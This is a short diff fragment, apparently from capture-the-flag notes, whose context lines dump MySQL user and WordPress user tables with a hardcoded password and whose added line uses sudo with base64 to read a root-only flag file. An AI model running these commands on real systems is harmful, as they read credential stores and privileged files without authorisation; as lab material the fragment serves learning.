@@ -13,3 +13,5 @@ echo "select * from mysql.user;" | mysql -h 127.0.0.1 -uwordpress -pskade
 echo "select * from wordpress.wp_users;" | mysql -h 127.0.0.1 -uwordpress -pskade 
 
 export TERM=xterm >>>> 
+
+sudo base64 /root/flag.txt | base64 -d
